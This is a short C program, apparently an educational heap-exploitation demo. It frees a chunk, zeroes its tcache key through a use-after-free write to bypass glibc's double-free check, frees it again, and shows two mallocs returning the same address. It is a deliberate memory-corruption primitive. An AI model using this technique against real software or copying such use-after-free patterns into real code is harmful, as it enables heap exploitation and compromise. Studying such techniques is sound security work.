#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main() {
    char *a = malloc(0x30);

    printf("a = %p\n", a);

    free(a);
    puts("[+] first free done");

    puts("[+] corrupt tcache key through UAF write");
    ((uintptr_t *)a)[1] = 0;

    free(a);
    puts("[+] second free done");

    char *p = malloc(0x30);
    char *q = malloc(0x30);

    printf("p = %p\n", p);
    printf("q = %p\n", q);

    if (p == q) {
        puts("[+] duplicate allocation: p == q");
    } else {
        puts("[-] p != q");
    }

    return 0;
}
